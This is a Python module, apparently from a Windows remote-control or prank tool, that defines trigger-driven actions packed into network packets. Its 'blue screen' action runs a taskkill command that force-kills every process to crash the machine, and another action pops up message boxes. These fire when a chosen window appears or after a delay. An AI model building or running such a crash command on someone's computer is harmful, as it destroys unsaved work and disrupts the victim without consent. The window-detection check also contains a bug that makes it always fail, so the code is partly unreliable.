from os import system
from time import time
from libs.packets import *
from typing import Any, Dict
from win32gui import MessageBox
import win32gui
import re

Packet = Dict[str, Any]


class ActionKind:
    BLUESCREEN = 0
    ERROR_MSG = 1


class StartPrqKind:
    NONE = 0
    WHEN_CONNECTED = 1
    WHEN_LAUNCH_APP = 2
    AFTER_TIME = 3


class EndPrqKind:
    NONE = 0


class ParamType:
    INT = int
    STRING = str
    FLOAT = float
    BOOL = bool


class ActionParam:
    def __init__(self, label: str, _type: int, default: Any, custom: dict = None):
        self.label = label
        self.type = _type
        self.default = default
        self.custom = custom

    def valid(self, value: str) -> str | None:
        """调用此函数以验证输入框中的值是否有效, 返回的字符串即为错误信息"""
        return None

    def parse_string(self, value: str) -> Any:
        return self.type(value)


class IntParam(ActionParam):
    def __init__(self, label: str, default: int, max: int | None = None, min: int | None = None):
        super().__init__(label, ParamType.INT, default, {"max": max, "min": min})

    def valid(self, value: str) -> str | None:
        try:
            num = self.parse_string(value)
        except ValueError:
            return "请输入正确的整数"
        if self.custom["max"] is not None and num > self.custom["max"]:
            return f"请输入小于等于{self.custom['max']}的整数"
        if self.custom["min"] is not None and num < self.custom["min"]:
            return f"请输入大于等于{self.custom['min']}的整数"


class FloatParam(ActionParam):
    def __init__(self, label: str, default: float):
        super().__init__(label, ParamType.FLOAT, default)

    def valid(self, value: str) -> str | None:
        try:
            self.parse_string(value)
            return
        except ValueError:
            return "请输入正确的浮点数"
        except TypeError:
            return "请输入正确的浮点数"


class BoolParam(ActionParam):
    def __init__(self, label: str, default: bool):
        super().__init__(label, ParamType.BOOL, default)

    def valid(self, value: bool) -> True:
        return True


class StringParam(ActionParam):
    def __init__(self, label: str, default: str):
        super().__init__(label, ParamType.STRING, default)


class Prq:
    params = {}

    def __init__(self, kind: int, datas: dict = {}):
        self.kind = kind
        self.datas = datas

    def valid(self) -> bool:
        return True

    def to_tuple(self) -> tuple[int, dict, int]:
        return self.kind, self.datas

    @staticmethod
    def from_tuple(_tuple: tuple[int, dict]) -> "Prq":
        kind, datas = _tuple
        return Prq(kind, datas)

    @staticmethod
    def ch_name() -> str:
        return "undefined"

    def name(self) -> str:
        return self.ch_name()


class StartPrq(Prq):
    @staticmethod
    def from_tuple(_tuple: tuple[int, dict]) -> "StartPrq":
        kind, datas = _tuple
        return start_prqs_map[kind](**datas)


class EndPrq(Prq):
    @staticmethod
    def from_tuple(_tuple: tuple[int, dict]) -> "EndPrq":
        kind, datas = _tuple
        print(_tuple)
        return end_prqs_map[kind](**datas)


class NoneStartPrq(StartPrq):
    def __init__(self):
        super().__init__(StartPrqKind.NONE)

    def valid(self) -> bool:
        return True

    @staticmethod
    def ch_name() -> str:
        return "无"


class LaunchAppStartPrq(StartPrq):
    params = {"app_name": StringParam("出现窗口: ", "Notepad")}

    def __init__(self, app_name: str):
        super().__init__(StartPrqKind.WHEN_LAUNCH_APP, {"app_name": app_name})
        self.complete_pattern = re.compile(app_name)

    def valid(self) -> bool:
        self.complete_pattern = re.compile(self.datas["app_name"])
        find_app = False
        win32gui.EnumWindows(self._check_window, [find_app])
        return find_app

    def _check_window(self, hwnd: int, find_app: list[bool]):
        title = win32gui.GetWindowText(hwnd)
        if re.match(self.complete_pattern, title):
            find_app[0] = True

    @staticmethod
    def ch_name() -> str:
        return "应用启动时"

    def name(self):
        return f"启动 {self.app_name} 时"

    @property
    def app_name(self):
        return self.datas["app_name"]

    @app_name.setter
    def app_name(self, value: str):
        self.datas["app_name"] = value


class AfterTimeStartPrq(StartPrq):
    params = {"time": FloatParam("等待时间: ", 5)}

    def __init__(self, time: float):
        super().__init__(StartPrqKind.AFTER_TIME, {"time": time})
        self.timer_start = None

    def valid(self) -> bool:
        if self.timer_start is None:
            self.timer_start = time()
            return False
        return time() - self.timer_start >= self.time

    @property
    def time(self):
        return self.datas["time"]

    @staticmethod
    def ch_name() -> str:
        return "等待x秒后"

    def name(self):
        return f"等待 {self.time} 秒后"


class NoneEndPrq(EndPrq):
    def __init__(self):
        super().__init__(EndPrqKind.NONE)

    def valid(self) -> bool:
        return True

    @staticmethod
    def ch_name() -> str:
        return "无"


class AnAction:
    def __init__(self, kind: int, datas: dict = {}) -> None:
        self.kind = kind
        self.datas = datas

    def execute(self):
        pass

    def to_tuple(self) -> tuple[int, dict]:
        return self.kind, self.datas

    @staticmethod
    def from_tuple(_tuple: tuple[int, dict]) -> "AnAction":
        kind, datas = _tuple
        return actions_map[kind](**datas)

    def name(self) -> str:
        return self.ch_name()

    @staticmethod
    def ch_name() -> str:
        return "undefined"

    def __str__(self):
        return self.name()


class BlueScreenAction(AnAction):
    def __init__(self):
        super().__init__(ActionKind.BLUESCREEN)

    def execute(self):
        system('taskkill /fi "pid ge 1" /f')

    @staticmethod
    def ch_name() -> str:
        return "蓝屏"


class ErrorMsgBoxAction(AnAction):
    def __init__(self, msg: str = "你好", caption: str = "提示"):
        super().__init__(ActionKind.ERROR_MSG, {"msg": msg, "caption": caption})

    def execute(self):
        print(self.datas)
        start_and_return(MessageBox, (0, self.datas["msg"], self.datas["caption"], 0))

    @staticmethod
    def ch_name() -> str:
        return "显示弹窗"


class TheAction:
    def __init__(
        self,
        name: str,
        check_inv: float = 1,
        actions: list[AnAction] = [],
        start_prqs: list[StartPrq] = [],
        end_prqs: list[EndPrq] = [],
    ):
        self.name = name
        self.actions = actions
        self.start_prqs = start_prqs
        self.end_prqs = end_prqs
        self.check_inv = check_inv

    def build_packet(self) -> Packet:
        """将整个动作打包成字典"""
        packet = {"name": self.name}
        packet["check_inv"] = self.check_inv
        packet["actions"] = [action.to_tuple() for action in self.actions]
        packet["start_prqs"] = [start_prq.to_tuple() for start_prq in self.start_prqs]
        packet["end_prqs"] = [end_prq.to_tuple() for end_prq in self.end_prqs]
        return packet

    @staticmethod
    def from_packet(packet: Packet) -> "TheAction":
        """将字典解包成动作"""
        return TheAction(
            packet["name"],
            packet["check_inv"],
            [AnAction.from_tuple(action) for action in packet["actions"]],
            [StartPrq.from_tuple(start_prq) for start_prq in packet["start_prqs"]],
            [EndPrq.from_tuple(end_prq) for end_prq in packet["end_prqs"]],
        )

    def check(self):
        """检测是否能够启动动作"""
        for start_prq in self.start_prqs:
            if not start_prq.valid():
                return False
        return True

    def execute(self):
        """执行动作"""
        for action in self.actions:
            action.execute()

    def __str__(self):
        return self.name


actions_map: dict[int, AnAction] = {
    ActionKind.BLUESCREEN: BlueScreenAction,
    ActionKind.ERROR_MSG: ErrorMsgBoxAction,
}
start_prqs_map: dict[int, StartPrq] = {
    StartPrqKind.NONE: NoneStartPrq,
    StartPrqKind.WHEN_LAUNCH_APP: LaunchAppStartPrq,
    StartPrqKind.AFTER_TIME: AfterTimeStartPrq,
}
end_prqs_map: dict[int, EndPrq] = {EndPrqKind.NONE: NoneEndPrq}
